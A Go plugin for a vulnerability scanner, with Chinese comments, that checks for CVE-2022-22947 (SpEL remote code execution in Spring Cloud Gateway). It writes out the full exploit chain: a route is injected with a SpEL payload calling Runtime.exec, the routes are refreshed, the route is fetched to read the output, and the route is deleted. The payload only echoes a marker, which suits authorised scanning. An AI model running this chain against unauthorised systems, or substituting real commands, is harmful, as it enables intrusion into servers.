// Package cve_2022_22947 是 CVE-2022-22947 Spring Cloud Gateway SpEL RCE 的 Go 插件实现。
//
// 与 YAML 模板的对照:
//   YAML: 4 步 workflow (add-route → refresh → trigger → cleanup)
//   Go:   同样 4 步, 但用代码控制流程, 可以做更多错误处理和条件分支
//
// Go 插件的优势在此场景:
//   - 可动态生成随机 route_id（不依赖占位符引擎）
//   - 可检查每一步的响应状态, 中途失败立即清理
//   - 可在 trigger 步骤解析 JSON 响应, 精确匹配 SpEL 输出
package cve_2022_22947

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/gosleek/gosleek/internal/plugin"
	"github.com/gosleek/gosleek/internal/placeholder"
	"github.com/gosleek/gosleek/pkg/types"
)

func init() {
	plugin.Register(&CVE202222947{})
}

type CVE202222947 struct{}

func (p *CVE202222947) Meta() types.TemplateMeta {
	return types.TemplateMeta{
		ID:          "CVE-2022-22947-go",
		Name:        "Spring Cloud Gateway Actuator SpEL RCE (Go)",
		Description: "Spring Cloud Gateway 3.1.0/3.0.6 Actuator 端点暴露, 注入 SpEL 表达式导致 RCE。Go 插件版: 动态生成路由, 精确解析响应, 确保清理。",
		Severity:    "critical",
		Author:      "gosleek",
		Tags:        []string{"cve", "rce", "spel", "spring", "gateway", "actuator"},
		Reference: []string{
			"https://nvd.nist.gov/vuln/detail/CVE-2022-22947",
			"https://tanzu.vmware.com/security/cve-2022-22947",
		},
	}
}

func (p *CVE202222947) Fingerprints() []types.FingerprintRule {
	// 无指纹预过滤, 对所有目标尝试
	return nil
}

func (p *CVE202222947) NeedsOOB() bool { return false }

// marker 与 YAML 模板保持一致 (短字符串, 无下划线, 避免 echo 输出截断差异)
const marker = "QAXNB12138"

func (p *CVE202222947) Verify(ctx context.Context, pctx *plugin.Context) (*types.Result, error) {
	target := pctx.Target
	hostname := pctx.TargetInfo.Hostname
	reporter := pctx.Reporter

	// 动态生成随机路由 ID（Go 原生, 不依赖占位符引擎）
	routeID := "gs_" + placeholder.RandTextAlpha(8)
	pctx.Log.Info("生成路由ID: %s, 目标: %s", routeID, target)

	// SpEL payload: 保持与 YAML 完全一致, echo marker, 输出通过 AddResponseHeader 回显
	spelPayload := fmt.Sprintf(
		`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("echo %s").getInputStream()))}`,
		marker,
	)

	// 使用 encoding/json 构造合法 JSON, 自动转义 payload 中的双引号等特殊字符
	routeBody := map[string]interface{}{
		"id": routeID,
		"filters": []map[string]interface{}{
			{
				"name": "AddResponseHeader",
				"args": map[string]string{
					"name":  "Result",
					"value": spelPayload,
				},
			},
		},
		"uri": "http://example.com",
		"predicates": []map[string]interface{}{
			{
				"name": "Path",
				"args": map[string]string{
					"pattern": "/test",
				},
			},
		},
	}
	routeJSONBytes, err := json.Marshal(routeBody)
	if err != nil {
		pctx.Log.Error("构造路由 JSON 失败: %v", err)
		return nil, err
	}
	routeJSON := string(routeJSONBytes)

	// ─── 步骤 0: add-route ───
	createRaw := fmt.Sprintf(
		"POST /actuator/gateway/routes/%s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/json\r\n"+
			"Accept: */*\r\n"+
			"Connection: close\r\n\r\n%s",
		routeID, hostname, routeJSON,
	)
	reporter.LogStep("add-route", 0)
	reporter.LogRequest("add-route", 0, 0, createRaw)
	resp, err := pctx.Client.SendRaw(ctx, target, createRaw)
	if err != nil {
		reporter.LogResponse("add-route", 0, 0, 0, "", createRaw, 0)
		pctx.Log.Debug("add-route 请求失败: %v", err)
		return nil, err
	}
	reporter.LogResponse("add-route", 0, 0, resp.StatusCode, resp.Body, resp.Raw, resp.Time)

	matched := resp.StatusCode == 201
	reporter.LogMatch("add-route", 0, 0, matched, "or", []string{"status", "word"},
		fmt.Sprintf("status: %d", resp.StatusCode))
	if !matched {
		pctx.Log.Debug("add-route 路由创建失败 (期望201, 实际%d): 可能 Actuator 未暴露", resp.StatusCode)
		return nil, nil
	}
	pctx.Log.Info("add-route 路由创建成功: %s (status=%d)", routeID, resp.StatusCode)

	// ─── 步骤 1: refresh ───
	refreshRaw := fmt.Sprintf(
		"POST /actuator/gateway/refresh HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Content-Type: application/json\r\n"+
			"Accept: */*\r\n"+
			"Connection: close\r\n\r\n",
		hostname,
	)
	reporter.LogStep("refresh", 1)
	reporter.LogRequest("refresh", 1, 0, refreshRaw)
	resp, err = pctx.Client.SendRaw(ctx, target, refreshRaw)
	if err != nil {
		reporter.LogResponse("refresh", 1, 0, 0, "", refreshRaw, 0)
		pctx.Log.Debug("refresh 请求失败: %v", err)
		cleanupRoute(ctx, pctx, target, hostname, routeID)
		return nil, err
	}
	reporter.LogResponse("refresh", 1, 0, resp.StatusCode, resp.Body, resp.Raw, resp.Time)

	matched = resp.StatusCode == 200
	reporter.LogMatch("refresh", 1, 0, matched, "or", []string{"status"},
		fmt.Sprintf("status: %d", resp.StatusCode))
	if !matched {
		pctx.Log.Debug("refresh 路由刷新失败 (期望200, 实际%d)", resp.StatusCode)
		cleanupRoute(ctx, pctx, target, hostname, routeID)
		return nil, nil
	}
	pctx.Log.Info("refresh 路由刷新成功 (status=%d)", resp.StatusCode)

	// ─── 步骤 2: trigger ───
	triggerRaw := fmt.Sprintf(
		"GET /actuator/gateway/routes/%s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Accept: */*\r\n"+
			"Connection: close\r\n\r\n",
		routeID, hostname,
	)
	reporter.LogStep("trigger", 2)
	reporter.LogRequest("trigger", 2, 0, triggerRaw)
	resp, err = pctx.Client.SendRaw(ctx, target, triggerRaw)
	if err != nil {
		reporter.LogResponse("trigger", 2, 0, 0, "", triggerRaw, 0)
		pctx.Log.Debug("trigger 请求失败: %v", err)
		cleanupRoute(ctx, pctx, target, hostname, routeID)
		return nil, err
	}
	reporter.LogResponse("trigger", 2, 0, resp.StatusCode, resp.Body, resp.Raw, resp.Time)

	// 对齐 YAML 模板: status==200 AND marker in part:all (headers+"\n"+body)
	partAll := resp.AllHeaders() + "\n" + resp.Body
	vulnerable := resp.StatusCode == 200 && strings.Contains(partAll, marker)

	// 额外: 大小写不敏感回退匹配
	if !vulnerable {
		partAllLower := strings.ToLower(partAll)
		markerLower := strings.ToLower(marker)
		if strings.Contains(partAllLower, markerLower) {
			vulnerable = true
		}
	}

	// 构造匹配证据
	evidence := ""
	matchTypes := []string{"status", "word"}
	cond := "and"
	if vulnerable {
		evidence = fmt.Sprintf("SpEL 回显 marker %q (status=%d)", marker, resp.StatusCode)
		if h := resp.GetHeader("Result"); h != "" && strings.Contains(h, marker) {
			evidence += " 响应头 Result = " + h
		} else if strings.Contains(resp.Body, marker) {
			evidence += " (在响应体中检出)"
		}
	} else {
		evidence = fmt.Sprintf("status=%d, marker 未在 part:all 中找到", resp.StatusCode)
	}
	reporter.LogMatch("trigger", 2, 0, vulnerable, cond, matchTypes, evidence)

	// ─── 步骤 3: cleanup (无论是否检出都执行) ───
	cleanupRoute(ctx, pctx, target, hostname, routeID)

	if !vulnerable {
		pctx.Log.Debug("marker %q 未检出漏洞", marker)
		return nil, nil
	}
	pctx.Log.Info("命中漏洞, marker %q 已确认", marker)

	return &types.Result{
		TemplateID:  "CVE-2022-22947-go",
		Name:        "Spring Cloud Gateway Actuator SpEL RCE",
		Severity:    "critical",
		Description: "Spring Cloud Gateway Actuator 端点暴露, 攻击者可注入 SpEL 表达式执行任意命令",
		Target:      target,
		MatchedAt:   time.Now().Format("2006-01-02 15:04:05"),
		Tags:        []string{"cve", "rce", "spel", "spring", "gateway", "actuator"},
		Reference: []string{
			"https://nvd.nist.gov/vuln/detail/CVE-2022-22947",
		},
		Evidence:    evidence,
		RawRequest:  createRaw,
		RawResponse: resp.Raw,
	}, nil
}

// cleanupRoute 删除测试路由, 避免残留。忽略错误。
func cleanupRoute(ctx context.Context, pctx *plugin.Context, target, hostname, routeID string) {
	raw := fmt.Sprintf(
		"DELETE /actuator/gateway/routes/%s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"Accept: */*\r\n"+
			"Connection: close\r\n\r\n",
		routeID, hostname,
	)
	pctx.Reporter.LogStep("cleanup", 3)
	pctx.Reporter.LogRequest("cleanup", 3, 0, raw)
	resp, err := pctx.Client.SendRaw(ctx, target, raw)
	if err != nil {
		pctx.Reporter.LogResponse("cleanup", 3, 0, 0, "", raw, 0)
		pctx.Log.Debug("cleanup 请求失败: %v", err)
		return
	}
	pctx.Reporter.LogResponse("cleanup", 3, 0, resp.StatusCode, resp.Body, resp.Raw, resp.Time)
	matched := resp.StatusCode == 200
	pctx.Reporter.LogMatch("cleanup", 3, 0, matched, "or", []string{"status"},
		fmt.Sprintf("status: %d", resp.StatusCode))
	pctx.Log.Info("cleanup 路由已清理 (status=%d)", resp.StatusCode)
}

